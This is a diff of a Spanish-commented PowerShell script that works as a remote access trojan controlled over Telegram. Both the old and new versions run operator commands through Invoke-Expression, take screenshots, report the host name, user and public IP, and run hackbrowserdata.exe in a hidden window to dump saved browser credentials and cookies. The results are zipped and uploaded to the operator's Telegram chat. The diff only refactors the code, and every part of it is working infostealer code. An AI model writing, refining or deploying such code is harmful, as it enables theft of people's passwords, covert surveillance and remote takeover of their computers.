@@ -1,37 +1,24 @@
 param(
-    [Parameter(Mandatory=$true)]
     [string]$Token,
-    
-    [Parameter(Mandatory=$true)] 
     [string]$ChatId
 )
 
-# === PREVENIR MULTIPLES INSTANCIAS ===
-$mutexName = "Global\TelegramBot_$($Token.Substring(0,10))"
-$mutex = New-Object System.Threading.Mutex($false, $mutexName)
-if (-not $mutex.WaitOne(0, $false)) {
-    Write-Host "[!] Bot ya esta corriendo. Saliendo..."
+if (-not $Token -or -not $ChatId) {
+    Write-Host "Error: Se requiere Token y ChatId"
     exit 1
 }
 
-# Diccionario para trackear comandos en ejecucion
-$script:RunningCommands = @{}
-$script:LastCommandTime = @{}
-$cmdLock = New-Object System.Object
-
-trap {
-    $mutex.ReleaseMutex()
-    $mutex.Dispose()
-    exit 1
-}
-
-$ErrorActionPreference = 'Continue'
+# === CONFIGURACION ===
 $ApiUrl = "https://api.telegram.org/bot$Token"
-$LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
-$HackPath = Join-Path $env:APPDATA 'CarpetaDos\hackbrowserdata.exe'
+$LogFile = "$env:APPDATA\CarpetaDos\bot.log"
+$HackPath = "$env:APPDATA\CarpetaDos\hackbrowserdata.exe"
 
-New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null
+# Crear directorio
+if (-not (Test-Path (Split-Path $LogFile))) {
+    New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force | Out-Null
+}
 
+# === FUNCIONES BASICAS ===
 function Write-Log {
     param([string]$Message)
     $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
@@ -39,253 +26,185 @@ function Write-Log {
     Write-Host $line
 }
 
-# Desactivar webhook y limpiar updates
-try {
-    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
-    Start-Sleep -Seconds 2
-    # Limpiar updates pendientes
-    $updates = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -Method Get
-    if ($updates.result.Count -gt 0) {
-        $lastId = ($updates.result | Select-Object -Last 1).update_id
-        Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId + 1)" -Method Get | Out-Null
-    }
-    Write-Log "Webhook desactivado y updates limpiados"
-} catch {
-    Write-Log "Error limpiando: $($_.Exception.Message)"
-}
-
-function Send-Message {
-    param([string]$Text, [string]$TargetChatId = $ChatId)
+function Send-TelegramMessage {
+    param([string]$Text)
     try {
-        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
-        
-        $body = @{
-            chat_id = $TargetChatId
-            text = $Text
-        } | ConvertTo-Json -Compress
-        
+        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
         Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
         return $true
     } catch {
-        Write-Log "Error Send-Message: $($_.Exception.Message)"
+        Write-Log "Error enviando mensaje: $($_.Exception.Message)"
         return $false
     }
 }
 
-function Send-File {
-    param(
-        [string]$Path, 
-        [string]$Caption="", 
-        [string]$TargetChatId = $ChatId
-    )
+function Send-TelegramFile {
+    param([string]$FilePath, [string]$Caption = "")
+    
+    if (-not (Test-Path $FilePath)) {
+        Write-Log "Archivo no existe: $FilePath"
+        return $false
+    }
     
     try {
-        if (-not (Test-Path $Path)) {
-            Write-Log "Archivo no existe: $Path"
-            return $false
-        }
+        # Metodo nativo usando .NET WebClient (funciona en PS 5.1)
+        $webClient = New-Object System.Net.WebClient
+        $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
         
-        $fileInfo = Get-Item $Path
-        if ($fileInfo.Length -gt 49MB) {
-            Send-Message -Text "Archivo muy grande: $($fileInfo.Name)" -TargetChatId $TargetChatId
-            return $false
-        }
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileName = [System.IO.Path]::GetFileName($FilePath)
         
-        # Metodo nativo PowerShell 5.1 - Form
-        $form = @{
-            chat_id = $TargetChatId
-            document = Get-Item $Path
-        }
+        # Construir body multipart manualmente
+        $header = "--$boundary`r`n" +
+                  "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n" +
+                  "$ChatId`r`n" +
+                  "--$boundary`r`n" +
+                  "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`n" +
+                  "Content-Type: application/octet-stream`r`n`r`n"
         
-        if ($Caption) {
-            $form['caption'] = $Caption
-        }
+        $footer = "`r`n--$boundary--`r`n"
         
-        $response = Invoke-RestMethod -Uri "$ApiUrl/sendDocument" -Method Post -Form $form
-        Write-Log "Archivo enviado OK: $($fileInfo.Name)"
+        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header)
+        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)
+        
+        $body = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
+        [System.Buffer]::BlockCopy($headerBytes, 0, $body, 0, $headerBytes.Length)
+        [System.Buffer]::BlockCopy($fileBytes, 0, $body, $headerBytes.Length, $fileBytes.Length)
+        [System.Buffer]::BlockCopy($footerBytes, 0, $body, ($headerBytes.Length + $fileBytes.Length), $footerBytes.Length)
+        
+        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
+        $response = $webClient.UploadData("$ApiUrl/sendDocument", "POST", $body)
+        
+        $webClient.Dispose()
+        Write-Log "Archivo enviado: $fileName"
         return $true
         
     } catch {
-        Write-Log "Error Send-File: $($_.Exception.Message)"
+        Write-Log "Error enviando archivo: $($_.Exception.Message)"
         return $false
     }
 }
 
-function Get-Info {
+# === INFO DEL SISTEMA ===
+function Get-SystemInfo {
     try {
-        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
+        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip
     } catch { $ip = "Desconocida" }
-    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip"
+    
+    try {
+        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption
+    } catch { $os = "Windows" }
+    
+    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
 }
 
+# === SCREENSHOT ===
 function Take-Screenshot {
     try {
         Add-Type -AssemblyName System.Windows.Forms, System.Drawing
         
-        # Verificar sesion interactiva
-        $explorer = Get-Process "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1
-        if (-not $explorer) {
-            Send-Message -Text "Error: No hay sesion de escritorio activa"
-            return $false
-        }
-        
         $screen = [System.Windows.Forms.Screen]::PrimaryScreen
         $bounds = $screen.Bounds
         
-        # Crear bitmap con verificacion
         $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        
-        # Capturar
         $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
         
-        $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        
-        # Guardar
+        $path = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
         $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
         
-        # Liberar recursos
         $graphics.Dispose()
         $bitmap.Dispose()
         
-        # Verificar archivo
-        if (-not (Test-Path $path)) {
-            Send-Message -Text "Error: No se pudo guardar screenshot"
-            return $false
-        }
+        $result = Send-TelegramFile -FilePath $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         
-        # Enviar
-        $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        
-        # Limpiar
         Remove-Item $path -Force -ErrorAction SilentlyContinue
         
         return $result
         
     } catch {
         Write-Log "Error screenshot: $($_.Exception.Message)"
-        Send-Message -Text "Error capturando: $($_.Exception.Message)"
+        Send-TelegramMessage -Text "Error al capturar pantalla: $($_.Exception.Message)"
         return $false
     }
 }
 
-function Close-BrowserWindows {
-    # Cerrar solo ventanas abiertas por hackbrowserdata (procesos recientes)
-    $browsers = @("chrome", "msedge", "firefox")
-    foreach ($browser in $browsers) {
-        try {
-            $procs = Get-Process $browser -ErrorAction SilentlyContinue | Where-Object { 
-                $_.StartTime -gt (Get-Date).AddMinutes(-1) -and $_.MainWindowTitle -eq ""
-            }
-            foreach ($proc in $procs) {
+# === STEAL BROWSER DATA ===
+function Steal-BrowserData {
+    Send-TelegramMessage -Text "Iniciando extraccion de datos..."
+    Write-Log "Iniciando extraccion"
+    
+    if (-not (Test-Path $HackPath)) {
+        Send-TelegramMessage -Text "Error: hackbrowserdata.exe no encontrado"
+        return
+    }
+    
+    # Guardar procesos de navegador actuales
+    $existingBrowsers = Get-Process @("chrome", "msedge", "firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
+    
+    $outputDir = "$env:TEMP\browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
+    
+    try {
+        # Ejecutar hackbrowserdata
+        $proc = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outputDir`" -f json" -PassThru -WindowStyle Hidden -Wait
+        
+        Write-Log "HackBrowserData finalizado con codigo: $($proc.ExitCode)"
+        
+        # Cerrar navegadores abiertos por hackbrowserdata (solo los nuevos)
+        Start-Sleep -Seconds 1
+        $currentBrowsers = Get-Process @("chrome", "msedge", "firefox") -ErrorAction SilentlyContinue
+        foreach ($browser in $currentBrowsers) {
+            if ($existingBrowsers -notcontains $browser.Id) {
                 try {
-                    $proc.Kill()
-                    Write-Log "Cerrado proceso $browser PID $($proc.Id)"
+                    $browser.Kill()
+                    Write-Log "Cerrado navegador PID $($browser.Id)"
                 } catch {}
             }
-        } catch {}
-    }
-}
-
-function Run-Steal {
-    param([string]$TargetChatId = $ChatId)
-    
-    # Verificar si ya esta corriendo
-    [void][System.Threading.Monitor]::Enter($cmdLock)
-    try {
-        if ($script:RunningCommands.ContainsKey('steal') -and $script:RunningCommands['steal']) {
-            Send-Message -Text "Ya hay una extraccion en curso..." -TargetChatId $TargetChatId
-            return
         }
-        $script:RunningCommands['steal'] = $true
-    } finally {
-        [System.Threading.Monitor]::Exit($cmdLock)
-    }
-    
-    try {
-        Send-Message -Text "Iniciando extraccion..." -TargetChatId $TargetChatId
-        Write-Log "Iniciando extraccion"
         
-        if (-not (Test-Path $HackPath)) {
-            Send-Message -Text "Error: hackbrowserdata.exe no encontrado" -TargetChatId $TargetChatId
+        # Buscar y enviar archivos
+        $files = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
+        
+        if (-not $files) {
+            Send-TelegramMessage -Text "No se encontraron archivos de datos"
             return
         }
         
-        # Guardar lista de procesos antes
-        $beforeBrowsers = Get-Process @("chrome", "msedge") -ErrorAction SilentlyContinue | Select-Object Id, ProcessName
-        
-        $outputDir = Join-Path $env:TEMP "browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$((Get-Random -Maximum 9999))"
-        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
-        
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = $HackPath
-        $psi.Arguments = "dump -d `"$outputDir`" -f json"
-        $psi.CreateNoWindow = $true
-        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi.UseShellExecute = $false
-        $psi.RedirectStandardOutput = $true
-        $psi.RedirectStandardError = $true
-        
-        $proc = [System.Diagnostics.Process]::Start($psi)
-        
-        if (-not $proc.WaitForExit(180000)) {
-            $proc.Kill()
-            Send-Message -Text "Timeout en extraccion" -TargetChatId $TargetChatId
-            return
-        }
-        
-        # Cerrar ventanas de navegador abiertas por hackbrowserdata
-        Start-Sleep -Seconds 2
-        Close-BrowserWindows
-        
-        # Buscar JSONs
-        $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
-        
-        if (-not $jsonFiles) {
-            Send-Message -Text "No se generaron archivos" -TargetChatId $TargetChatId
-            return
-        }
-        
-        Write-Log "Encontrados $($jsonFiles.Count) archivos"
-        Send-Message -Text "Encontrados $($jsonFiles.Count) archivos. Enviando..." -TargetChatId $TargetChatId
+        Send-TelegramMessage -Text "Encontrados $($files.Count) archivos. Enviando..."
         
         $sent = 0
-        foreach ($json in $jsonFiles) {
-            $zipPath = Join-Path $env:TEMP "$($json.BaseName)_$(Get-Random).zip"
+        foreach ($file in $files) {
+            $zipPath = "$env:TEMP\$($file.BaseName)_$(Get-Random).zip"
+            
             try {
-                Compress-Archive -Path $json.FullName -DestinationPath $zipPath -Force
+                Compress-Archive -Path $file.FullName -DestinationPath $zipPath -Force
                 
-                if (Send-File -Path $zipPath -Caption $json.BaseName -TargetChatId $TargetChatId) {
+                if (Send-TelegramFile -FilePath $zipPath -Caption $file.BaseName) {
                     $sent++
                 }
                 
-                Start-Sleep -Milliseconds 1000
+                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                Start-Sleep -Seconds 1
+                
             } catch {
-                Write-Log "Error con $($json.Name): $($_.Exception.Message)"
-            } finally {
-                if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
+                Write-Log "Error con $($file.Name): $($_.Exception.Message)"
             }
         }
         
-        Send-Message -Text "Completado. Enviados: $sent de $($jsonFiles.Count)" -TargetChatId $TargetChatId
+        Send-TelegramMessage -Text "Extraccion completada. Enviados $sent de $($files.Count) archivos."
         
     } finally {
         # Limpiar
-        if ($outputDir -and (Test-Path $outputDir)) {
+        if (Test-Path $outputDir) {
             Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
-        }
-        
-        [void][System.Threading.Monitor]::Enter($cmdLock)
-        try {
-            $script:RunningCommands['steal'] = $false
-        } finally {
-            [System.Threading.Monitor]::Exit($cmdLock)
         }
     }
 }
 
-function Execute-Cmd {
-    param([string]$Command, [string]$TargetChatId = $ChatId)
+# === EJECUTAR COMANDO ===
+function Execute-Command {
+    param([string]$Command)
     
     Write-Log "Ejecutando: $Command"
     
@@ -293,119 +212,98 @@ function Execute-Cmd {
         $output = Invoke-Expression $Command 2>&1 | Out-String
         
         if ([string]::IsNullOrWhiteSpace($output)) {
-            $output = "(sin salida)"
+            $output = "(comando ejecutado sin salida)"
         }
         
-        $tempFile = Join-Path $env:TEMP "cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+        $tempFile = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
         $content = "Comando: $Command`nFecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output"
         [System.IO.File]::WriteAllText($tempFile, $content, [System.Text.Encoding]::UTF8)
         
-        Send-File -Path $tempFile -Caption "Resultado: $Command" -TargetChatId $TargetChatId
+        Send-TelegramFile -FilePath $tempFile -Caption "Resultado: $Command"
         
         Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         
     } catch {
-        Send-Message -Text "Error: $($_.Exception.Message)" -TargetChatId $TargetChatId
+        Send-TelegramMessage -Text "Error ejecutando comando: $($_.Exception.Message)"
     }
 }
 
+# === PROCESAR COMANDOS ===
 function Process-Command {
-    param([string]$Text, [string]$FromChatId, [int]$UpdateId)
+    param([string]$Text)
     
-    # Evitar procesar el mismo update dos veces
-    [void][System.Threading.Monitor]::Enter($cmdLock)
-    try {
-        if ($script:LastCommandTime.ContainsKey($UpdateId)) {
-            return  # Ya procesado
-        }
-        $script:LastCommandTime[$UpdateId] = Get-Date
-        
-        # Limpiar entradas antiguas (mas de 5 minutos)
-        $old = $script:LastCommandTime.GetEnumerator() | Where-Object { $_.Value -lt (Get-Date).AddMinutes(-5) }
-        foreach ($o in $old) {
-            $script:LastCommandTime.Remove($o.Key)
-        }
-    } finally {
-        [System.Threading.Monitor]::Exit($cmdLock)
-    }
+    $cmd = $Text.Trim().ToLower()
+    $args = ""
     
-    Write-Log "Procesando: '$Text'"
-    $cmd = $Text.Trim()
-    $cmdLower = $cmd.ToLower()
-    
-    if ($cmdLower -match '^(/?[a-z]+)\s*(.*)') {
+    if ($cmd -match '^(/?\w+)\s*(.*)$') {
         $baseCmd = $Matches[1]
         $args = $Matches[2].Trim()
     } else {
         return
     }
     
+    Write-Log "Procesando comando: $baseCmd"
+    
     switch ($baseCmd) {
-        { $_ -in 'ls', '/ls' } {
+        "/help" {
+            Send-TelegramMessage -Text @"
+Comandos disponibles:
+/help - Mostrar ayuda
+/info - Info del sistema
+/ls - Listar archivos
+/pwd - Directorio actual
+/cd <ruta> - Cambiar directorio
+/cmd <comando> - Ejecutar comando
+/captura - Capturar pantalla
+/steal - Extraer datos de navegadores
+"@
+        }
+        
+        "/info" {
+            Send-TelegramMessage -Text (Get-SystemInfo)
+        }
+        
+        "/ls" {
             try {
                 $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
-                Send-Message -Text "Directorio: $(Get-Location)`n`n$items"
+                Send-TelegramMessage -Text "Directorio actual: $(Get-Location)`n`n$items"
             } catch {
-                Send-Message -Text "Error: $($_.Exception.Message)"
+                Send-TelegramMessage -Text "Error: $($_.Exception.Message)"
             }
         }
         
-        { $_ -in 'cmd', '/cmd' } {
-            if ($args) {
-                Execute-Cmd -Command $args
-            } else {
-                Send-Message -Text "Uso: /cmd <comando>"
-            }
+        "/pwd" {
+            Send-TelegramMessage -Text "Directorio: $(Get-Location)"
         }
         
-        { $_ -in 'cd', '/cd' } {
+        "/cd" {
             if ($args) {
                 try {
-                    Set-Location $args -ErrorAction Stop
-                    Send-Message -Text "Ahora en: $(Get-Location)"
+                    Set-Location $args
+                    Send-TelegramMessage -Text "Ahora en: $(Get-Location)"
                 } catch {
-                    Send-Message -Text "Error: No se pudo ir a '$args'"
+                    Send-TelegramMessage -Text "Error: No se pudo cambiar a '$args'"
                 }
             } else {
-                Send-Message -Text "Uso: /cd <ruta>"
+                Send-TelegramMessage -Text "Uso: /cd <ruta>"
             }
         }
         
-        { $_ -in 'pwd', '/pwd' } {
-            Send-Message -Text "Directorio: $(Get-Location)"
-        }
-        
-        { $_ -in 'steal', '/steal' } {
-            # Ejecutar en background para no bloquear
-            Start-Job -ScriptBlock {
-                param($Func, $Chat)
-                & $Func -TargetChatId $Chat
-            } -ArgumentList ${function:Run-Steal}, $FromChatId | Out-Null
-        }
-        
-        { $_ -in 'captura', '/captura' } {
-            Send-Message -Text "Capturando..."
-            if (-not (Take-Screenshot)) {
-                Send-Message -Text "Error al capturar"
+        "/cmd" {
+            if ($args) {
+                Execute-Command -Command $args
+            } else {
+                Send-TelegramMessage -Text "Uso: /cmd <comando>"
             }
         }
         
-        { $_ -in 'info', '/info' } {
-            Send-Message -Text (Get-Info)
+        "/captura" {
+            Send-TelegramMessage -Text "Capturando pantalla..."
+            Take-Screenshot | Out-Null
         }
         
-        { $_ -in 'help', '/help' } {
-            Send-Message -Text @'
-Comandos:
-/ls - Listar archivos
-/cmd <comando> - Ejecutar comando
-/cd <ruta> - Cambiar directorio
-/pwd - Directorio actual
-/steal - Extraer datos navegadores
-/captura - Screenshot
-/info - Info del sistema
-/help - Esta ayuda
-'@
+        "/steal" {
+            Steal-BrowserData
         }
         
         default {
@@ -414,39 +312,46 @@ Comandos:
     }
 }
 
-# Inicio
+# === INICIO DEL BOT ===
 Write-Log "=== BOT INICIADO ==="
 Write-Log "ChatId: $ChatId"
 
-Send-Message -Text "Bot online - $(Get-Info)"
+# Enviar mensaje de inicio
+$info = Get-SystemInfo
+Write-Log "Info: $info"
+Send-TelegramMessage -Text "Bot online - $info"
 
+# Limpiar webhook
+try {
+    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
+    Start-Sleep -Seconds 2
+    Write-Log "Webhook limpiado"
+} catch {
+    Write-Log "Error limpiando webhook: $($_.Exception.Message)"
+}
+
+# Bucle principal
 $lastUpdateId = 0
 
 while ($true) {
     try {
-        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=1"
-        $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
+        $response = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=1" -TimeoutSec 60
         
         if ($response.ok -and $response.result.Count -gt 0) {
             $update = $response.result[0]
             $lastUpdateId = $update.update_id
-            $message = $update.message
             
-            if ($message -and $message.text) {
-                $msgChatId = [string]$message.chat.id
+            if ($update.message -and $update.message.text) {
+                $msgChatId = [string]$update.message.chat.id
+                
                 if ($msgChatId -eq $ChatId) {
-                    Process-Command -Text $message.text -FromChatId $msgChatId -UpdateId $update.update_id
+                    Process-Command -Text $update.message.text
                 }
             }
         }
     } catch {
         $err = $_.Exception.Message
-        if ($err -like "*409*") {
-            try {
-                Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -TimeoutSec 10 | Out-Null
-                Start-Sleep -Seconds 3
-            } catch {}
-        } else {
+        if ($err -notlike "*409*") {
             Write-Log "Error: $err"
         }
         Start-Sleep -Seconds 2
